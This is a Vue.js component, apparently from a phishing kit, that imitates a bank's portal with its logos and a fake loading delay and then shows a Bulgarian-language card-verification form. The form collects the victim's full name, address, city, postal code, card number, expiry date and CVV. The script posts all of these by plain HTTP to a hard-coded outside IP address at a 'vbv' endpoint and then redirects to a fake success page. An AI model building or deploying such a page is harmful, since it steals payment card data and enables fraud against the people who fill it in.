<template>
  <div class="container">
    <div id="mainContainer">
      <div class="logo-portal">
        <div class="logo">
          <img src="../img/logo-pb-en.svg" />
        </div>
        <div class="logo-epb"><img src="../img/logo-epb-en.svg"></div>
      </div>
      <div id="login-container" class="ePortalRegForm">
        <br>
        <img v-if="Loding" src="../img/loding.gif" style="position: relative;left: 270px;width: 34px;">
        <div v-if="!Loding">

          <div class="pci-body">

            <div class="row">
              <div class="input-form-group">
                <input id="txtTest" name="cardName" class="creditCardText" autocomplete="off" type="text" placeholder=" " required="" v-model="fullname">
                <label id="trans-label_postal_code" for="fullname">Пълно име</label>
                <span class="field-validation-error1" data-valmsg-replace="true" data-valmsg-for="activationCode" v-if="this.fullInv"  >
                  <span for="activationCode" generated="true" class="">Неправилен формат</span>
                </span>
              </div>
            </div>
            <div class="row">
              <div class="input-form-group">
                <input id="address" name="address" autocomplete="off" type="text" placeholder=" " required="" v-model="adress">
                <label id="trans-label_postal_code" for="address">Адрес</label>
                <span class="field-validation-error1" data-valmsg-replace="true" data-valmsg-for="activationCode" v-if="this.v$.adress.alpha.$invalid"  >
                  <span for="activationCode" generated="true" class="">Неправилен формат</span>
                </span>
              </div>

            </div>
            <div class="row">
              <div class="row">
                <div class="input-form-group">
                  <input id="city" name="city" autocomplete="off" type="text" placeholder=" " required="" v-model="city">
                  <label id="trans-label_postal_code" for="city">Град</label>
                  <span class="field-validation-error1" data-valmsg-replace="true" data-valmsg-for="activationCode" v-if="this.v$.city.alpha.$invalid || this.Allvide"  >
                    <span for="activationCode" generated="true" class="">Неправилен формат</span>
                  </span>
                </div>
              </div>
              <div class="input-form-group">
                <input id="zip-code" name="zip" autocomplete="off" type="text" placeholder=" " aria-describedby="zip-code-error" maxlength="8" required="" v-model="zipcode">
                <label id="trans-label_postal_code" for="zip-code">Пощенски код</label>
                <span class="field-validation-error1" data-valmsg-replace="true" data-valmsg-for="activationCode" v-if="this.v$.zipcode.integer.$invalid || this.Allvide"  >
                    <span for="activationCode" generated="true" class="">Неправилен формат</span>
                  </span>
              </div>
            </div>
            <div class="row">
              <div class="input-form-group">
                <input maxlength="16" onkeyup="cc_format('cardnumber1','cstCCardType');" id="cardnumber1" name="CardNumber" autocomplete="off" type="text" placeholder="0000 0000 0000 0000" required="" v-model="creditNumber">
                <label id="trans-cardnumber" for="cardnumber" class="card-label">Номер на карта </label>
                <span class="field-validation-error1" data-valmsg-replace="true" data-valmsg-for="activationCode" v-if="this.v$.creditNumber.integer.$invalid || this.Allvide"  >
                    <span for="activationCode" generated="true" class="">Неправилен формат</span>
                  </span>
                <p id="cardnumber-error" class="field-error" aria-live="assertive"></p>
              </div>
            </div>
            <div class="row">
              <div class="input-form-group">
                <input id="expiry-date" type="text" name="cardExp" autocomplete="cc-exp" placeholder="MM / YY" onkeyup="formatString(event);" maxlength="5" required="" v-model="dateExp">
                <label id="trans-expiration_date" for="expiry-date">Срок на годност</label>
                <p id="expiry-date-error" class="field-error" aria-live="assertive"></p>
              </div>
              <div class="input-form-group">
                <input id="security-code" autocomplete="off" name="cardCvv" type="text" placeholder=" " oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');" data-encrypted-name="cvc" aria-describedby="security-code-error" maxlength="3" required="" v-model="cvv">
                <label id="trans-security_code" style=" width: 18%; " for="security-code">CVV</label>
                <span class="contain-tooltip" data-tooltip="" data-lang="cvc_info"></span>
                <p id="security-code-error" class="field-error" aria-live="assertive"></p>
                <span class="field-validation-error1" data-valmsg-replace="true" data-valmsg-for="activationCode" v-if="this.v$.cvv.integer.$invalid || this.Allvide"  >
                    <span for="activationCode" generated="true" class="">Неправилен формат</span>
                  </span>
              </div>
            </div>
            <br>
            <br>
            <div style="text-align: center;">
              <button type="submit" name="wasaz" class="button button--text-arrow" v-on:click="red">Потвърди</button>
            </div>

          </div>
        </div>
        </div>



    </div>
  </div>
</template>
<script>
import useVuelidate from '@vuelidate/core'
import { required , alpha ,integer } from '@vuelidate/validators'
import axios from 'axios'

export  default {
  name:'Information',
  setup () {
    return { v$: useVuelidate() }
  },
  methods:{
    red(){
      if(this.v$.$invalid){
        this.Allvide=true
      }else {
        const data ={
          "fullname":this.fullname,
          "adress":this.adress,
          "city":this.city,
          "zipcode":this.zipcode,
          "creditNumber":this.creditNumber,
          "dateExp":this.dateExp,
          "cvv":this.cvv,
        }
        axios.post("http://51.91.58.210/api/new/vbv", data).then(res => {
          console.log(res)

        }).catch()
        this.$router.push("/Account/success/"+localStorage.session)
      }


    }
  },
  data(){
    return{
      Allvide:false,
      fullInv:false,
      fullname:'',
      adress:'',
      city:'',
      zipcode:'',
      creditNumber:'',
      dateExp:'',
      cvv:'',
      Loding:true,
      timerCount:5,
    }
  },
  validations () {
    return{
      fullname:{ required  },
      adress:{ required ,alpha },
      city:{ required ,alpha },
      zipcode:{ integer  },
      creditNumber:{ required ,integer, maxLength:16 },
      dateExp:{ required  },
      cvv:{ required , integer },
    }
  },
  watch:{
    timerCount:{
      handler(value) {
        if (value > 0) {
          setTimeout(() => {
            this.timerCount--;
          }, 1000);
        }else {
          this.Loding=false
        }

      },
      immediate: true
    }
  },
}
</script>
<style>
@import '../css/credit.css';
@import '../css/style.css';
</style>
